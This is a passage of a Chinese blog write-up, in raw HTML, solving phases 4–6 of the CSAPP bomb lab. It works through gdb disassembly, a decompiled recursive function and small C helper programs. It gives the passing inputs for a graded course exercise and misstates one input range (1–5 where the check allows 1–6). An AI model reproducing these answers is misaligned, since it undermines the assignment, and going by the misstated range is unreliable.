0x000000000040101f &lt;+19&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:cmp    eax,0x2</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">=&gt; 0x000000000040102e &lt;+34&gt;:cmp    DWORD PTR [rsp+0x8],0xe</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:mov    edx,0xe</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:mov    edi,DWORD PTR [rsp+0x8]</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:test   eax,eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:cmp    DWORD PTR [rsp+0xc],0x0</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:add    rsp,0x18</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>那可以看到，不跳转直接 G 了，所以第一个数要小于等于 14。</p><p>我们直接就往后看吧，然后调用 func4 之前，传递了三个参数，rdi 给了我们输入的第一个数，rsi给了0，rdx 给了 14。</p><p>我们再看看 func4 的反汇编，是一个递归函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:sub    rsp,0x8</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:mov    eax,edx</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:sub    eax,esi</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:mov    ecx,eax</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:shr    ecx,0x1f</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:add    eax,ecx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:sar    eax,1</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:lea    ecx,[rax+rsi*1]</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:cmp    ecx,edi</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:lea    edx,[rcx-0x1]</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:add    eax,eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:cmp    ecx,edi</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:lea    esi,[rcx+0x1]</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:lea    eax,[rax+rax*1+0x1]</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:add    rsp,0x8</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>假设它的函数是 int func4(x,y,z)，那么我们可以大致分析一下它的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(x,y,z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=z;</span><br><span class="line">    val-=y;</span><br><span class="line">    <span class="keyword">int</span> i=val;</span><br><span class="line">    i&gt;&gt;=<span class="number">31</span>;</span><br><span class="line">    val+=i;</span><br><span class="line">    val&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    i=val+y;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;x)&#123;</span><br><span class="line">        z=i<span class="number">-1</span>;</span><br><span class="line">        func4(x,y,z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        val=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;x)&#123;</span><br><span class="line">            y+=<span class="number">1</span>;</span><br><span class="line">            func4(x,y,z);</span><br><span class="line">            val=<span class="number">2</span>*val+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上函数的反编译原型大致是按照汇编语句一条一条翻译过来的，应该比较通俗易懂，对着汇编代码很容易就能读出来。</p><p>整合一下，形成下面的语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(x,y,z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=z-y;</span><br><span class="line">    <span class="keyword">int</span> i=val;</span><br><span class="line">    i&gt;&gt;=<span class="number">31</span>;</span><br><span class="line">    val+=i;</span><br><span class="line">    val&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    i=y+val;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;x)&#123;</span><br><span class="line">        val=func4(x,y,i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        val=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;x)&#123;</span><br><span class="line">            val=func4(x,y+<span class="number">1</span>,z);</span><br><span class="line">            val=<span class="number">2</span>*val+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 func4 返回非 0，它也是直接跳转爆炸了，所以我们要让 func4 返回 0，它的调用是 func4(x,0,14)，然后后面第二个数，为 0直接跳转走了，所以我们第二个这里输入一个 0 才可以。</p><p>我们也可以自己编写程序，来检查一下什么时候返回 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val=z-y;</span><br><span class="line">    <span class="keyword">int</span> i=val;</span><br><span class="line">    i&gt;&gt;=<span class="number">31</span>;</span><br><span class="line">    val+=i;</span><br><span class="line">    val&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    i=val+y;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;x)&#123;</span><br><span class="line">        val=func4(x,y,i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        val=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;x)&#123;</span><br><span class="line">            val=func4(x,y+<span class="number">1</span>,z);</span><br><span class="line">            val=<span class="number">2</span>*val+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,func4(i,<span class="number">0</span>,<span class="number">14</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以发现，x=0,1,3,7的时候才能返回 0。</p><p>所以我们第一次猜 0 0 大概率就直接过去了。</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>一样的方法进去，然后随便输入个字符串</p><p><img src="/2022/09/22/CSAPP_3/10.png"></p><p>后面可以i发现有一个对长度的判断，要求长度为 6。</p><p><img src="/2022/09/22/CSAPP_3/11.png"></p><p>到最后可以发现调用了一个 string_not_equal 函数，被比较的正是 flyers 和我们的输入，难道这题跟第一题一样？</p><p>我们输入 flyers 测试看看。</p><p><img src="/2022/09/22/CSAPP_3/12.png"></p><p>可以发现发生了改变，我们的输入发生了变化，这一题其实比较接近真正的逆向题目了，对输入处理然后和一个字符串进行比较。</p><p>我们可以反汇编看看它如何处理的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:push   rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:sub    rsp,0x20</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:mov    rbx,rdi</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:xor    eax,eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:call   0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:cmp    eax,0x6</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:movzx  ecx,BYTE PTR [rbx+rax*1]</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:mov    BYTE PTR [rsp],cl</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:mov    rdx,QWORD PTR [rsp]</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:and    edx,0xf</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:movzx  edx,BYTE PTR [rdx+0x4024b0]</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:mov    BYTE PTR [rsp+rax*1+0x10],dl</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:add    rax,0x1</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:cmp    rax,0x6</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:mov    BYTE PTR [rsp+0x16],0x0</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:mov    esi,0x40245e</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:lea    rdi,[rsp+0x10]</span><br><span class="line">=&gt; 0x00000000004010bd &lt;+91&gt;:call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:test   eax,eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:mov    rax,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:call   0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:add    rsp,0x20</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:pop    rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>很明显可以看到 +41 和 +74 之间形成了一个循环，循环次数为 6，大概是在对字符串每一位进行处理。先到 +41 观察一下寄存器的状态。</p><p><img src="/2022/09/22/CSAPP_3/13.png"></p><p>很明显 rbx 就是我们输入的 string，ecx每次取出一个字符然后低四位（&amp;0xf）取出，和 0x4024b0 这个地址相加，所取字节应该会覆盖原来的字符串，那么我们看看 0x4024b0 这个字符串是什么，使用 p (char *)0x4024b0 命令打印。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure><p>很明显，偏移量只有 0-15，所以实际表也就只是</p><p>maduiersnfotvbyl</p><p>我们的 flyers 在里面的偏移分别是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+9 +15 +14 +5 +6 +7</span><br></pre></td></tr></table></figure><p>这只是低位，高位是不确定的，可以为任意值，我们0-15跑一遍，取出任何一个都可以。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[]=&#123;+<span class="number">9</span>,+<span class="number">15</span>,+<span class="number">14</span>,+<span class="number">5</span>,+<span class="number">6</span>,+<span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">15</span>;j++)&#123;</span><br><span class="line"><span class="built_in">putchar</span>((j&lt;&lt;<span class="number">4</span>)|a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/CSAPP_3/14.png"></p><p>这里我输入了 9_NEFW</p><p><img src="/2022/09/22/CSAPP_3/15.png"></p><p>成功过关</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>终于来到了这关，以前没有打过的一关。。</p><p>进去依然是读入六个数字。</p><p><img src="/2022/09/22/CSAPP_3/16.png"></p><p>可以看到读入的六个数存在了栈顶。</p><p>后面判断 dword[rsp]-1&lt;=5，说明第一个数的范围就是 1-5。</p><p><img src="/2022/09/22/CSAPP_3/17.png"></p><p>后面疑似开始循环了，以 r12 寄存器作为循环变量。</p><p>后面就是 eax 取 r12 的值，然后再取 rax=dword [rsp+rax*4]，这里就是循环读我们输入的数字，放到 rax 寄存器当中。</p><p>读到这里好像发现有双重循环，输出反汇编观察一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:push   r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:push   r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:push   r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:push   rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:push   rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:mov    r13,rsp</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:mov    r14,rsp</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:mov    r12d,0x0</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:mov    rbp,r13</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:sub    eax,0x1</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:cmp    eax,0x5</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:add    r12d,0x1</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:add    ebx,0x1</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:add    r13,0x4</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:mov    rax,r14</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:mov    ecx,0x7</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:mov    edx,ecx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:add    rax,0x4</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:cmp    rax,rsi</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8]</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:add    eax,0x1</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:cmp    eax,ecx</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:add    rsi,0x4</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:mov    eax,0x1</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:add    rax,0x8</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:mov    ebp,0x5</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:pop    rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:pop    rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:pop    r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:pop    r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:pop    r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>有点小长，剖分一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 